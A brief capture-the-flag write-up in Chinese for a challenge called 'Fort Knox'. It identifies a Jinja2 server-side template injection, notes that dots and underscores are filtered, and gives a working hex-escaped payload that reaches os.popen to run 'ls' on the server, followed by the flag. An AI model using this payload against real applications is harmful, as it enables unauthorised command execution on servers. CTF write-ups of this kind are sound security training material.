# Fort Knox

- `{{ 2*3 }}`
    - `6`
- `{{ 7*'7' }}`
    - `7777777`

- 由以上可以判斷出是Jinja2 SSTI
- 但是擋掉`.`和`_`
- 可以簡單繞過:
    - `{{''["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fmro\x5f\x5f"][2]["\x5f\x5fsubclasses\x5f\x5f"]()[59]["\x5f\x5finit\x5f\x5f"]["func\x5fglobals"]["linecache"]["os"]["popen"]('ls')["read"]()}}`
- `ASIS{Kn0cK_knoCk_Wh0_i5_7h3re?_4nee_Ane3,VVh0?_aNee0neYouL1k3!}`
